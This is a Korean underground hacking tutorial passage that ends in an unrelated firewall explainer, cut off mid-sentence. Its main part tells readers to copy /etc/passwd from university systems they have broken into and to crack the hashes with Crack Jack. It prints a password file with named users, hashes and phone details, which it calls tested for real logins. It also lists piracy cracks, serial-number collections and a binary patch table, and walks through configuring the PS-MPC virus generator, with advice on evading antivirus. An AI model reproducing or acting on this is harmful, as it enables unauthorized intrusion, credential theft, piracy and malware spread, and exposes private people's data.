패스워드 화일이 줄줄줄 나올겁니다.
우리가 예를들어 어느 대학 전산망에 침투했다면
접속을 한후 /etc 로 이동한후 패스워드 화일을 갈무리하는게
가장 손쉬운 방법입니다.
이를 다시 "크랙잭"등으로 돌리면 패스워드가 일치할경우 찾아내주는것입니다.

다음과 같은 패스워드 화일들에 대해서 설명을 하죠.


1)로긴명:        아이디입니다.
2)암호화된 비밀번호:          DES로 암호화되어 역추적불가능하죠.
  단지,크랙잭같은 프로그램으로 대입만 가능할 뿐이죠.
3)사용자의 아이디넘버:
4)사용자의 그룹넘버:
5)디스크립션:
6)로긴홈디렉토리:
7)로긴셀

1)   2)            3)4)5)      6)7)
root:WEilPYJf3WBj6:0:1:Operator:/:/bin/csh
nobody:*:65534:65534::/:
daemon:*:1:1::/:
sys:*:2:2::/:/bin/csh
bin:*:3:3::/bin:
uucp:*:4:8::/var/spool/uucppublic:
news:*:12:6:Internet News:/usr/lib/news:/bin/csh
usenet:*:13:6:/Internet News Helper:/var/spool/news:/bin/csh
ingres:*:7:7::/usr/ingres:/bin/csh
audit:*:9:9::/etc/security/audit:/bin/csh
sync::1:1::/:/bin/sync
sysdiag:*:0:1:Old System Diagnostic:/usr/diag/sysdiag:/usr/diag/sysdiag/sysdiag
sundiag:*:0:1:System Diagnostic:/usr/diag/sundiag:/usr/diag/sundiag/sundiag
lim:jAN90JhjdNIX2:3001:10:Seogdae Lim,{Computer Center SUN630CC(3000)}:/home4/lim:/bin/csh
lee:fspD3tUjKYR9E:3003:10:training member:/home/lsy:/bin/csh
songgi:NiIND3QyqF7nc:3004:20:Songgi Min:/home2/songgi:/bin/csh
yeongguk:RVPUHkvu1Xpl6:3005:10:Yungguk Cho:/home2/yeongguk:/bin/csh
jungkk:FOr3wq0MXohEQ:3006:10:Kapkyu Jung:/home2/jkkk:/bin/csh
leesy:JAerYaGOF3E92:3007:10:Soonyi Lee:/home2/leesy:/bin/csh
nyoungmi:tU0oS1lvZh07E:3008:10:Youngmi Lho:/home2/nyoungmi:/bin/csh
limsd:AvSQtKfAiSwpw:3009:10:Seogdae Lim:/home4/limsd:/bin/csh
piadm:pxbrdd90BfyNc:3010:90:PI/open Administrator:/usr/isys:/bin/sh
staff:WqNVQ3aKJoPOg:3011:10:system admin staff:/home4/staff:/bin/csh
kreonet:HXrRbEGxfNDT.:3501:3500:KREONET of KAIST,{찗쏮첲산쟤(3500)}:/home2/kreonet:/bin/csh
kmucc:XGOXIUD7hhDLg:3601:3600:Keimyung Univ.,{UNIVERSITY(3600)}:/home2/kmucc:/bin/csh
pusan:i0Dwz1WzyckUk:3602:3600:Pusan Univ(510-1860):/home2/pusan:/bin/csh
donga:nW1mEg90C2emc:3603:3600:Dong A Univ(200-6415):/home2/donga:/bin/csh
ympark:es6oTq31Uelfs:3604:3600:Kyungsang Univ,(0591-751-5132):/home2/ympark:/bin/csh
mskim:t0dv9tgBrQKGo:3902:3900:Mansik Kim,{Main Library(3900)#옷쨠쎂#}:/home2/malib/mskim:/bin/csh


이번에 함께제공하는 패스워드 화일을 설명하자면,
japan.cap    일본 모대학
pass.cap     인제대학교
pass.cap     어딘지 까먹었음
pwd.txt      me too.

이걸 바탕으로 '사전'을 이용해서 크랙잭을 돌려보면 패스워드를
잡아낼겁니다.
이걸로 실제 접속이 가능하니 해보세요.
모두 테스트를 거친것들입니다.
일반 대학 계정 있는 분들은 위에 알려준 방법으로 패스워드 화일을
빼내면 되고 쉐도우 패스워드로 보안을 유지하고 있는 곳은
at명령등을 써보고 그래도 안돼면 일단 게으르지 않은 관리자에게
존경의 박수를 보내며 다른 방법을 찾아봅시다.
크랙잭을 사용하는 법은 다음과 같습니다.

jack 을 실행하면 됩니다.
그러면 일단 패스워드 화일을 입력하라고 나옵니다.
예를 들어 pass.cap 을 치고 다음에는 사전을 입력하라고 합니다.
그러면 dict.txt 등을 치면 됩니다.
그러면 자동으로 사전속에 들어있는 것을 대입하여 암호를 찾아냅니다.
중간중간 암호를 찾아내었을때 삑~ 소리와 함께 암호와 아이디가 표시됩니다.
이러한 크랙잭에 걸리지 않기 위해서는 무조건 비밀번호를 어렵게 만드는
길밖에 없습니다.
특수문자 세자이상 넣으시길...

========================

다음은 제가 제공해드린 각종 자료들중 비중있는 중요한 자료에 대한 설명과 간단한
사용법 들입니다.
요구하시는 분들이 많아 포함시켰으니 참고바랍니다.

* 여기서 일부자료들은 변경이 된것도 있으니 여러분중 몇몇분은
  실제 받은 자료에서 추가/변경된게 있을수 있으니 착오없으시기
  바랍니다.
  이중에는 제가 개인적으로 가지고있는 것도 있으니 공부에 꼭 필요하다고
  생각되는게 있음 요청하시면 드릴수도 있습니다.

< 바이러스와 백신 >
PS-MPC        유명한 바이러스 제조기.설명은 보강강좌에 포함시켰음
VACCINE.ARJ   몇몇 백신의 소스가 포함되었습니다.


< 유틸리티 >
UUEXE540.ZIP  TEXT<->BIN화일 교환기입니다
; 게시판에 가끔 이상한 문자들이 쓰여진게 올라올때가 있을겁니다.
  자료실에 등록하기 힘든(약간 불법적인 자료,신속을 요할떄)때 사용들을많이하죠
  바이너리를 TEXT로 바꾸어 게시판에 올릴때, UUENCODE 화일명.EXE 하면 XXX.UUE
  로 되며 UUE로 된 파일을 게시판에 올리면 됩니다.
  반대로 게시판에서 받은 UUE를 다시 바이너리로 풀떄는,UUDECODE XXX.UUE 하면
  원래의 XXX.EXE가 나오는 것입니다. 이것은 상당히 유용하니 잘 쓰시길...
JUMIN.ARJ     주민등록번호 조회기
; 나우의 하얀맘님께서 제작해서 제공해주신 것입니다.
  기존 소스에 문제가 있다는것을 지적해주셔서 고쳐주신점 감사하게생각합니다.
BCTU          BCTU는 현재 1X.00 버전까지 제작되었습니다.
; 물론 BCTU는 확인된바로 가짜입니다. 전화비를 줄여주지 않습니다.
  현혹되지 마시고, 단지 이런것이 있다는것만 알아두시기를...
BOX           BOX는 진짜 전화비를 내지 않게 해주는 프로그램입니다.
; 단, 우리나라에서 사용하는 전화교환기는 미국과 틀려 안통합니다.
  미국내에서도 이제 BOX는 시골이나 통한다고 하더군요. 기대마시길~



< 락과 크랙 & 패치 >
EUN-CK.COM    은하영웅전설 4EX 암호 깨줍니다.
INSTALL.RAR   백신 V3 정식 등록판
; 실행하면 등록번호를 요구하게 되는데 이때 임의의 숫자를 지정한다.
C-LH25.ARJ    등대 2.5 정식등록 크랙입니다.
mdir3-crk.arj Mdir-III 크랙 2.5~2.70 까지의 모음집
; M3V270-C.ZIP 이 가장 무난하며,MSET.COM 을 실행하고 등록번호를 입력할시
  M2700-0000-0000-0000으로 넣어도 됩니다.
RC.ARJ        RAWCOPY 는 각종 게임의 암호를 깨주는 프로그램입니다
NEVLOCK.ARJ   네버락 입니다. 로우카피 처럼 게임암호를 깨주죠.
DATECRCK.RAR  시스템의 날짜로 바꾸어서 날짜제한 프로그램같은것을
              사용하는데 전혀 지장이 없게 해줍니다. MOVEDATE보다 개선됨
GW.ARJ        게임위자드는 잘 아실겁니다. 버전 32까지 나왔다는군요.
; 아쉽게도 저에게는 30정식밖에 없네요. 최신버전구하면 제공하죠.
ARJKEY.COM    ARJ를 정식으로 만들어줍니다.
Q40.RAR       유명한 Q 에디터 패치입니다.
UNPASS.COM    바이오스 에 걸린 암호를 깨줍니다.
UX.COM        실행압축된 파일들을 정상적으로 풀어줍니다.
; 역어셈블을 할경우 주로 쓰이게 됩니다.
EVER_CR.COM   에버락을 푼다고 하지만 기대는 안함.
B18UP         호스트 곰주인의 패치라나.. 뭐라나...
COPYIIPC      락을 깨준다는 대표적 "카피라이트"입니다.
FREEZE.LZH    시스템의 시간을 정지시킵니다.
; 시간이 정지되면 어디에 좋을지 생각해 보시길...
PASSPY.ZIP    암호를 알아낸다는 다소 황당한 프로그램이죠.
; 암호를 알아내는 방식이란게 다른 사람 컴에서 실행시켜서 인터럽트를
  가로채 플로피에 저장한다는 황당한 설정인데 이런거는 아무짝에도
  쓸모없습니다. 친구 암호알아낼때 쓴다면 몰라도...
REGISTER.ARJ  등록번호를 모아놓은것입니다.
; 이야기,ARJ,DCF,ZMODEM,ZIP,TBAV,WWP,WINZIP,GWS 등..

이외에 수백가지의 프로그램의 등록번호가 담긴 텍스트를 제공합니다.
물론 몇몇 분은 가지고계신분도있겠지만 없으신 분을 위해 드립니다.
추가로 중요한 크랙에 대한 부분도 있으니 참고하시길...
CRACK.ARJ 화일로 되어있습니다.

RAR 2.0의 경우 정식등록판을 만들기위한 방법입니다.
최근에 RAR 2.0에서 압축된것의 경우 그전버전에서 풀수가 없더군요.
이번기회에 다들 2.0으로 바꾸는게 좋을듯합니다.

┌──┬──────┬────────────┐
│Sec │Hex         │  ASCII                 │
├──┼──────┼────────────┤
│185 │307H        │  75 → 74              │
│187 │187H        │  75 → EB              │
│187 │497H , 498H │  75 → 90 , 3B → 90   │
│187 │503H , 504H │  75 → 90 , 35 → 90   │
│194 │389H        │  74 → EB              │
│239 │036H        │  74 → 75              │
│255 │472H        │  75 → EB              │
└──┴──────┴────────────┘


PS-MPC (The Phalcon/Skism Mass Produced Code Generator)

PS-MPC 는  미국의 바이러스 제작그룹인 팰콘 스킴즈에서 만든것입니다
초보자를 위해 제작된 바이러스-제조기 이죠.
이외에도 몇가지 다른 형태의 제조기가 존재합니다만 대표적인것으로
이것을 소개합니다.
바이러스를 만들기위해 어셈블리를 공부하고 힘들이는것보다는
바이러스의 기본적인 루틴들로 이루어진 ps-mpc 같은 제작기로
만드는것이 훨씬 빠르기 때문이죠.
여러분들은 일단 이것으로 바이러스의 기본적인 루틴들은 이해하시기
바랍니다.
두꺼운 어셈블리 책 한권놓고 참조해가며 코딩하면 엄청나게 응용할수
도 있습니다.
참고로 이 프로그램은 비상주형만 만들어 줍니다.

ps-mpc의 사용법은 CFG 파일을 에디터로 바꾸면 되는것입니다.
현재 국내에 발견된 바이러스로는 PS-MPC.Generix 라는 바이러스가 있습니다.
백신으로 체크하니 걸리더군요. 응용하실분은 뜯어고치져서 안걸리게 해보세요.

끝으로 컴파일은 MASM은 안되고 오로지 TASM 만 됩니다.
아래와. 같이 실행하면 나오게되는 ASM화일을 TASM으로 컴파일 하시면됩니다.
전번 제 하드폭파 사건이후 저에게있던 TASM이 지워져서 제공해드릴수
없군요.제가 예전에보내드린 TASM이 있거나 가지고계신분은 제게도
드리면 제가 필요로하는 분들꼐 드리죠.
C:\XXX>PS-MPC TEST.CFG 라고 입력하면 TEST.ASM 이 생성됩니다.



다음은 *.CFG 화일에 들어있는 내용들입니다.
이것들을 에디터로 편집하셔서 고치기만 하면 됩니다.

; FILE: SKELETON.CFG        <-화일이름입니다.
; Skeleton configuration file for PS-MPC version 0.90?
; Lines beginning with semicolons denote comments

; Required parameters:

; Filename = <string>
; This is the filename to be generated by PS-MPC as the source code file.
; 소스로 출력될 파일 이름
Filename = target.asm

; Infect = (C,E)
; COM, EXE
; Note: You can mix the two, a la "Infect = C,E"  Do not use a space to
;       deliminate the two parameters.
; 감염대상 C 만하면 COM 만 감염,E 로 하면 EXE도 감염되겠죠.
Infect = C,E

; Optional parameters - Defaults are shown in square brackets

; Traversal = <N,D>
; ([None], Dot Dot)
; If None is specified, then only the files in the current directory will be
; infected.  If Dot dot is specified, then files in the current directory and
; subdirectories below the current will be infected.
; 상위로 이동할 것인가? 현재 디렉토리만 감염시킬경우 퍼지기가 곤란하므로 Y 로
; 지정하는 것이 좋다.
Traversal = N

; Encrypted = <Y,N>
; (Yes, [No])
; Only turn off encryption if you wish to limit the size of the virus.
; 바이러스 암호화. TV 의 경우 암호화가 안된 바이러스만 PS-MPC 변형으로 진단
; 한다.
Encryption = Y

; IDWord = XX
; ([  ],XX)
; The IDWord consists of two characters which are used to identify already
; infected EXE files.  This line is not needed in COM-only infectors.  Do
; not use an apostrophe or the source code will not assemble properly.
; EXE 파일 실행인지 검사할때 사용하는 값으로 스텍값이 된다.
IDWord = DA

; MinSize = #
; (A,[0]..65535)
; MinSize is used only in the infection of COM files.  Files under MinSize
; bytes are not infected.  MinSize = 0 turns off this option.  MinSize = A
; indicates use of the virus's effective length as the minimum size.  This
; line is ignored in EXE-specific infectors.
; 감염시킬 파일의 최소크기.
MinSize = 0

; MaxSize = #
; (A,[0]..65535)
; MaxSize is used only in the infection of COM files.  Files above MaxSize
; bytes are not infected.  MaxSize = 0 turns off this option.  MaxSize = A
; indicates automatic calculation of maximum size. This line is not needed
; in EXE-only infectors.
; 감염시킬 파일의 최대크기
MaxSize = A

; Infections = #
; ([0]..255)
; Infections is an optional counter limiting the number of infections per run
; of the virus to a specific number.  Infections = 0 disables this option.
; 감염갯수
Infections = 0

; ErrorHandler = <Y,N>
; (Yes, [No])
; ErrorHandler selects if you wish to include a short critical error handler
; in the virus.  This handler prevents Abort, Retry, Fail messages by taking
; over the critical error interrupt.  Attempted infection of files on write-
; protected diskettes will not generate an error if this option is set.
; 에러헨들 (Int 24h) 를 가로챌것인가? N 하면 쓰기 방지 탭이 붙은 플로피에서
; 디스크 에러가 난다.
ErrorHandler = Y

; CommandCom = <Y,N>
; (Yes, [No])
; This flag indicates whether you wish the virus to infect COMMAND.COM
; 'Yes' turns off the check for COMMAND.COM, thus saving space.
; COMMAND.COM 을 감염에서 제외할것인가? (Yes 하면 COMMAND.COM 도 감염.
; 하지만, COMMAND.COM 에 감염되면 부팅이 안된다.
CommandCom = N

; VirusName = <string>
; The only limitation to the string is that you may not use both the single
; and double quotes together in the string, i.e. the string B'li"p is not
; legal.
; 바이러스이름 [] 안에 써주면 된다.
VirusName = [Skeleton]

; AuthorName = <string>
; The same constraints apply to AuthorName.
; 제작자 이름
AuthorName = Deke

; AllowZero = <Y,N>
; (Yes, [No])
; This flags whether the virus will allow an encryption value of 0, which
; would effectively leave it in an unencrypted state.  'Yes' disables the
; zero check, thereby shortening code length.
; 암호키중 0이면 암호화 안된 값이 되므로 0 은 감염키로 사용하지 않을것인가?
; Y 면 0 도 허락한다.
AllowZero = N

; Activation Conditions
; All conditions must be satisfied for activation to occur
; 특정할때만 작동할것인가?

; Always = <Y,N>
; (Yes, [No])
; This flags whether the virus always activates, although I can't imagine a
; useful virus that does so.
; Always = N

; IfMonth = #
; <1..12><-,+>
; Activate if the month is equal to the specified number.  Adding a minus sign
; after the month indicates activation before or during the specified month.
; Adding a plus sign after the month indicates activation during or after the
; specified month.
; IfMonth = 11+    ; Activate in either November or December

; IfDay = #
; <1..31><-,+>
; Activate if the date is on a certain date  Adding a minus sign after the day
; indicates activation on or before that day.  Similarly, adding a plus sign
; indicates activation on or after that day.  Note: the program does not check
; to see if the number inputted is a valid date.  For example, combining
; IfMonth=2 and IfDay=30+ will NOT result in an error, although the virus will
; clearly never activate.
; IfDay = 15+         ; Activate after the fifteenth of the month

; IfYear = #
; <0..65535><-,+>
; Activate during a certain year or years.  Don't be stupid and put a
; ridiculous year such as 1-.
; IfYear = 1993+      ; Activate after 1993

; IfDOW = #
; <0..6><-,+>
; 0 = Sunday, 1 = Monday, etc.
; Activate on, before, or after a particular day of the week.
; IfDOW = 0            ; Activate only on Sundays

; IfMonthDay = #,#
; <#,#><-,+>
; Activate on, before, or after a particular day of the year.  This differs
; from the combination of IfMonth and IfDay.
; IfMonthDay = 5,9+    ; Activate only after May 9th
; compare to:
; IfMonth = 5+         ; Activate in May through December, but only if the
; IfDay   = 9+         ; day is on or after the 8th.  July 1st is NOT an
                       ; activation date

; IfHour = #
; <0..23><-,+>
; This should be self-explanatory at this point.
; IfHour = 12          ; Activate any time from 12 noon -> 1 P.M.

; IfMinute = #
; <0..59><-,+>
; Duh.
; IfMinute = 30+

; IfSecond = #
; <0..59><-,+>  ;; check 0
; This is somewhat useless, in my estimation
; IfSecond = 30+

; Percentage = #
; <1..99>
; This uses the 1/100 second counter as a random number.  If the counter is
; less than the percentage, then the virus will activate.
; Percentage = 50      ; Even odds


=============================
안녕하세요.

이번 보강자료들.
1. 보강된 바이러스 제작툴 과 비비에스 해킹 프로그램들.
2. 보안 < firewall = 방화벽 > 에 대한 강좌.





1. Firewall 이란?
firewall 은 방화벽 이란 뜻이다.
방화벽이란 '화재를 방지하는 특수한 장치의 벽을 의미하는 것,불을 끄는 특수 기구
'라는 뜻으로 설명할 수 있다.
    방화벽 시스템은 필수적인 인터네트 서비스의 접근을 허락함과  동시에 기관
의 보안레벨을 확실히 증가시킬 수 있는 최선의 해결을 제공하는 방법이다. 다시
말해 데이터를 빼가거나 시스템을 망가뜨리는 해커들로부터 해당  네트워크를 보
호하는 시스템의 일종이다.
    물론 이 방화벽 시스템을 구현하는 것이 충분한 보장을 해준다고 볼 수는 없
다. 그러나 가장 효과적이고 비용이 비교적 저렴하게  드는 방법이라고 할 수 있
다. 그래서 네트워크를 설치한 각계 각층에서 최근 쉴새없이 방화벽에 대한 세미
나와 토론회를 개최하고 있는 것이다.
    방화벽이 네트워크로 연결된 호스트를 어떻게 보호하는가와 방화벽의 구성요
소를 알아보자.
인터네트에 연결된 컴퓨터 사용자 수는 현재 전세계적으로 4천만명 이상이
된다. 이처럼 많은 사람이 인터네트를 이용하게 되면서 정보 보안은 갈수록
중요해지고 있다.기업,관공서,연구소 등이 내부적으로 근거리통신망(LAN)을
구축하거나 사설망을 운영할 때에는 정보의 보안에 대해 심각하게 고려하지
않았다.
하지만 이제 기업간 또는 조직간정보의 교류가 중요해지면서 외부에 공개할
자료와 보안할 자료를 구분할 필요성이 점점 증대되고 있다.
인터네트는 유닉스 호스트를 기반으로 TCP/IP라는 공개적인 프로토콜을 사용
해 컴퓨터간 네트워크로 정보를 교환할 수 있도록 한 것이다.
유닉스와 TCP/IP는 개방화 방향으로 기술이 발전하고 있다. 또 네트워크에
연결된 자원의 활용을 극대화할 수 있도록 많은 유틸리키를 사용하고 있다.
따라서 유닉스와 TCP/IP는 정보의 보안에 관해서 매우 취약하다.
기업이 해외지사 또는 본집점간 정보의 공유를 원활하게 유지하기 위해 전자
메일을 도입하고 전체망을 인터네트에 연결했다면 전세계 인터네트 사용자들
도 이 전상망에 쉽게 침투, 전자메일 정보는 물론 기업의 중요한 정보도 쉽게
빼낼 수 있다. firewall은 내부의 전산망을 인터네트 등 외부망과 연결하거나
기업내 사설망을 구축할 경우 외부 사용자로부터 또는 기업간 사설망의 전자도
청으로부터 내부의 중요한 기밀과 정보를 보호하고 외부에 공개할 정보를 취사
선택할 수 있는 네트워크 정책을 수립할 수 있도록 기업내 사설망에 구축하는
전자보안시스템이다.
    방화벽의 원래 의미는 건물에서  발생한 화재가 더 이상  번지는 것을  막는
것이다. 이러한 의미를 인터네트에서 쓴다면 이는  네트워크의 보안 사고나 문제
가 더이상 확대되는 것을 막고 격리하려는 것으로 이해될 수 있다. 특히 어떤 기
관 내부의 네트워크를 보호하기 위해 외부에서의  불법적인 트래픽 유입을 막고,
허가되고 인증된 트래픽만을  허용하려는 적극적인 방어대책임을 알 수 있다.
    방화벽은 간단히 라우터, 호스트 시스템 또는  네트워크 보안을 제공하는 시
스템의 집합에 포함되지 않는다. 방화벽은 보안에의 접근이다. 즉, 허락되는 서비
스와 액세스를 정의 하는 것 보다 큰 보안 정책의 수행을 돕는다. 네트워크 구성,
그리고 하나 또는 그 이상의 호스트 시스템과 라우터 그리고  안정된 패스워드에
서 진보된 인증같은 다른 보안 수단이다.
    방화벽 시스템의 주된 목적은 보호된 네트워크 안밖으로의  접근을 내부에서
자유자재로 조정하는 것이다. 트래픽을 시험하고 평가할  수 있는 방화벽을 지나
는 접속을 제어함으로써 네트워크 액세스 정책을 수행한다.
    방화벽 시스템은 라우터, 퍼스날  컴퓨터, 호스트 또는  외부 호스트들로부터
악용될 수 있는 프로토콜과 서비스로부터 사이트 또는 서브네트를 보호하기 위해
특별히 셋업된 호스트들의 집합일 수도 있다.  방화벽 시스템은 일반적으로 사이
트의 인터네트 접속과 같은  하이레벨 게이트웨이에 위치한다. 하지만,  호스트나
서브네트의 보다 작은 집합을 보호하기 위해 로우레벨 게이트웨이에 위치할 수도
있다.

2. 유닉스,TCP/IP 보안 취약성
인터네트에서는 정보보안이 취약하다. 인터네트에서 제공하는 서비스(FTP,Telnet
,DNS,SMTP,NFS등)가 근본적으로 갖고 있는 보안에 대한 취약성과 잘못된 호스트
구성, 접근통제(Acces Control) 등에 기인한다.
인터네트에서 제공하는 서비스는 약5백개에 달한다. 이들 각각은 외부에서 침투할
경우 주요 공략 대상이 된다. 따라서 보안에 대한 시스템 관리자의 역할은 매우
중요하며 정기적인 보안대책 수립 및 실행, 인터네트 서비스들의 로그파일 분석
등 보안상황에 대한 수시 점검이 필요하다.
인터네트에서 발생한 보안 관련 사고는 대부분 유닉스 포스트의 사용자 인증처리
절차가 너무 간단하고 미약한데서 비롯된다. 유닉스상에 패스워드는 패스워드
크래커 등 해독프로그램에 의해 쉽게 해독되기 때문에 해커들의 주요 공략 대상이
 될 수 있다.
TCP/IP가 제공하는 서비스도 사용자 인증은 매우 취약하다고 할 수 있다.
예를 들어 NFS(Network File System)에서 인증은 사용자 인증이 아닌 IP주소
를 갖는 호스트 전체에 대한 인증이어서 특정 사용자 계정에 대한 인증은 불
가능하다.
Telnet, FTP, MAIL 등의 서비스 이용시로그인을 하거나 또는 클라이언트와
데이터를  주고 받을  ㎖ 데이터는 암호화되어 있지 않아 스니퍼 프로그램을
이용하거나 또는 인터네트 전용선을 태핑하든 어떤 경우에도 쉽게 데이터를
해독해 호스트에 침입하거나 취득한 정보를 다른 어떤 용 도로 사용할 수가
있다.
특히  X윈도슷템은 네트워크의 모니터 및 해킹을 하기에 매우 적합한 도구가
될 수 있다. 해커는X윈도스스템을 이용해 원격지 호스트의 윈도를 열어 패스
워드를 비롯 기타 보안유지가 필요한 중요한 정보들의 키보드  입력을 바로
모니터할 수가 있는 것이다.
LAN을 구축하거나 호스트간 네트워크로 연결한 경우에는 네트워크 자원의 효
율성을 높이기 위해 네트워크에 연결된 각 호스트Network Information System), 버클
리 r-명령어들을 사용하게 된다.
 이 경우 네트워크에 연결된 호스트중 한 곳만 해커에 침입을 당해도 그 네트
워크에 연결된 전 호스트가 보안에 문제가 발 생할 수 있다.
사실 인터네트에 연결됐다는 것은 내부의 네트워크가 전세계 인터네트 사용자
의 공경 대상이 되었다는 것으로 보아도 무방하다.
CERT/CC자료에 따르면 미국에서는 지난 88년이후 인터네트 사용자가 증가하는
비율보다도  인터네트 증가에 대해 보안 사고 비율이 급격히 증가하고 있다는
것이다.
인터네트 사용자가 많아지고 인터네트에 접속된 호스트가 증가하면 할수록 인
터네트 관련 보안사고는 기하급수적으로 증거한다는 것이다.
특히 호스트 시스템이 복잡하게 연결됐고  사이트의 명성이 높을 경우 해커들
의 좋은 목표가 될 수 있다는 점에서 보안에 대한 철저한 준비 및 통제, 대처
방안 등을 미리 수립하는 것이 매우 중요하다.
파이어월 개념과 필요성
파이어월은 단순히 네트워크의 구성요소인 라우터, 호스트시스템,  또는 네트
워크에 안전을 제공하는 시스템의 집합이라기 보다 네트워크 전체를 대상으로
안전에 접근하는 정책(policy)이라고 할 수 있다. 여기서 정책이라 함은 인터
네트에 연결할 때 제공하고자 하는 서비스의 종류,네트워크 구성의 정의,네트
워크에 접근하는 사용자의 분류,  안전의 측정 방법 등을 총괄적으로  정의할
수 있다.
파이어월 시스템은 보안하고자하는 네트워크의 접근을 통제하자는 것이다. 즉
네트워크의 접근통제정책(파이어월)을구현하는 것이다. 파이어월 시스템은 라
우터, pc,호스트 및 기타 프로토콜, 서비스를 보호하는데 사용하는  네트워크
장비들이 될 수 있다.  그러나 통상적으로 파이어월은 네트워크 정책 및 파이
어월 시스템을 포함한 전체를 뜻한다.
파이어월이 없는 환경에서는 네트워크의  보안은  전적으로  호스트 시스템의
보안에  의존하게 되며,  네트워크에 연결된 모든  호스트가 일정하게 역할을
분담해야 한다.  그러나   네트워크가 커지면 커질 수록 보안의  통제는 매우
어려워지며 잘못된 구성, 부적절한 패스워드 등이 원인이 되어 쉽게 네트워크
보안이 허물어지게 된다. 따라서 파이어월의 접근방법은 네트워크  전체의 보
안 수준을 높이며 해커의 침입 ＂시 적절히 대처할 수 있는 능력을 배양시키는
것이다.


3. 방화벽 시스템의 장점
방화벽시스템의 기본 목표는 네트워크 사용자에게  투명성을 보장하지  않아
약간의 제약을 주더라도 위험지대를  줄이려는 적극적인 보안대책을  제공하려는
것이다.
외부와의 투명성으로 내부망 전체가 위험지대임을 보여주고 있다.
네트워크 시스템에서 외부와 내부 네트워크사이의 유일한 패스에
방화벽시스템을 둔 것이다. 방화벽시스템이 보안서비스를  제공하여 불법적인 트
래픽을 거부하거나 막을 수 있게 되었다. 물론 투명성을 보장하지는 않지만 내부
네트워크를 안전지대로 만들 수 있다.
방화벽 시스템으로 접근하는 것은 전반적인 호스트 보안을  증진시키는데 도
움을 줌으로써 사이트에 많은 이점을 제공한다.

    1)취약한 서비스로부터 보호
    방화벽은 크게 네트워크 보안을  증가시키고 원천적으로 불안전한  서비스를
필터링함으로써 서브네트 상에 있는 호스트에 위험을 감소시킨다. 선택된 프로토
콜만이 방화벽을 통과 할  수 있기때문에, 서브네트 네트워크  환경은 위험에 덜
노출된다.

    2)호스트 시스템으로의 액세스 컨트롤
    방화벽은 또한 호스트 시스템으로의 액세스를 컨트롤할 수  있다. 예를 들면,
외부 네트워크에서 한 호스트로 접속할 수 있는데, 원하지 않는 액세스는 효과적
으로 차단해 준다. 사이트는 메일 서버나 NIS같은 특별한 경우를  제외한 외부로
부터의 액세스를 차단한다.

    3)보안의 집중
    방화벽은 대부분의 수정된 소프트웨어와  추가되는 보안 소프트웨어를  많은
호스트에 분산시키지 않고 방화벽에 설치할 수  있다는 점에서 경제적이다. 특별
히, one-time 패스워드 시스템과 다른 추가적인 인증 소프트웨를 인터네트로부터
액세스를 필요로하는 각 시스템과는 대조적으로 방화벽에 설치할 수 있다.

    4)확장된 프라이버시
    일반적으로 해가 없다고 생각되는  것들이 실질적으로 프라이버시  침해에의
결정적인 요인이 될 수 있다. 이들은 유용할 수 있는 실마리를 포함하고 있을 수
있기 때문에 어떤 사이트에서는 중요시  된다. 방화벽을 사용한 사이트(호스트외
의 연결 시스템)들은 핑거(finger)와 DNS(Domain Named Service)같은 서비스를
막고자 한다. 핑거는 마지막 로그인 시간과 메일 도착 여부,  다른 아이템들을 읽
었는지 등 해당 계정의 사용자 정보를 디스플레이해주는 명령어다.
    이런 편리한 '핑거' 서비스는 해커(시스템 침입자)들에게도 그 시스템이 얼마
나 자주 사용되는지, 시스템에 연결된 사용자가 있는지, 그리고 침해될 수 있는지
에 관한 정보를 보여준다. 따라서 방화벽은 가능하면 핑거를 이용하는 것을 막음
으로써 침입자들의 접근 요인을 막고자 하는 것이다.
    방화벽은 또한 사이트 시스템에 관한 DNS 정보를  막고자 하는데 사용된다.
그래서 사이트의 이름과 IP 어드레스를 인터네트 호스트에서 유출되지 않게한다.
어떤 사이트들은 이러한 정보를 막음으로써 침입자에 유용한 정보를 숨길  수 있
다고 생각한다.

    5)네트워크 사용과 비사용에서의 로그인과 통계자료 제공
    인터네트 안밖으로의 모든 액세스가 방화벽을 통과 한다면, 방화벽은 액세스
정보를 기록할 수 있고 네트워크 사용에 관한 유용한 통계자료를 제공한다. 의심
스로운 활동이 있을때 적당한 알람기능을 가진 방화벽은 방화벽과 네트워크가 침
입 시도를 받고 있는지 또는 침입 되었는에 대한 세부사항을 제공해 준다.




    6)정책 시행
    마지막으로 이것이 가장 중요한데, 방화벽은 네트워크 액세스 정책을 실행한
다. 사실상, 방화벽은 사용자들과  서비스의 액세스를 컨트롤할 수  있다. 그래서,
네트워크 액세스 정책은 방화벽에 의해서 시행될 수 있게 된다. 그러나 방화벽이
없다면, 그러한 정책들은 전적으로  사용자들의 협조에 의존해야 한다.  사이트는
자신의 사용자들의 협조에 의존하여 보안을 유지할 수 있기 때문이다. 그러나 일
반적으로 인터네트 사용자들에게는 적용되지 않는다.


4. 방화벽시스템의 기본 구성 요소
    방화벽시스템에 대한 각종 토론이 이루어지는 그룹에서는 방화벽시스템에 대
한 일반적인 용어 정의 및 개념을 설명하고 있다. 방화벽시스템이 가지는 여러가
지 기능과 보안 대처 수준에 따라 여러가지 종류의 방화벽시스템이 존재할 수 있
으나, 여기서는  일반적인 방화벽시스템의 구성요소를 소개한다. 이는 방화벽시스
템 개발자,  운영자 및 컨설트업체들이 거의 동의하고 있는 개념이다.

    1)네트워크 정책(Network Policy)
    방화벽 시스템의 설계, 설치, 사용에  직접적으로 영향을 줄 수  있는 두가지
레벨의 네트워크 정책이 있다. 하이레벨 정책은 명확한 이슈 즉, 제한된 네트워크
로부터 서비스를 허락할 것인가 또는 명확히 거부할 것인가를 정의하는 네트워크
액세스 정책이다. 이러한 서비스들을 어떻게 사용할 것인가,  그리고 이러한 정책
의 예외 조건등이 하이레벨 정책에 속한다. 로우레벨 정책은 어떻게 방화벽이 실
질적으로 액세스를 제한하고 하이레벨 정책에서 정의한 서비스를 필터링 할 것인
가에 대한 사항이다.

    2)방화벽시스템의 사용자인증 시스템(Advanced Authentication)
    방화벽시스템은 한 기관의 네트워크 전체를 보호해야 하므로  일반적으로 유
닉스시스템에서 사용되는 단순한 패스워드  기법으로 사용자를 인증하는  방법을
사용하지는 않는다.   우수한 인증수단으로는  스마트 카드,   어탠디케이션 토큰
(Authentication tokens), 바이오메트릭스(Biometrics)  그리고 소프트웨어 메카니
즘 등을 사용한다. 현재 많이 사용하고  있는 우수한 인증시스템으로는 일회용패
스워드(One Time Passwd)시스템이 있다. 매번 사용자가 로그인을 시도할 때 마
다 매번 새로운 패스워드를 이용하는 것인데, 이는 침입자들이 최근 이용하고 있
는 스니퍼(sniffer)에 의한 패킷가로채기를 통해 시스템의 사용자ID와 패스워드를
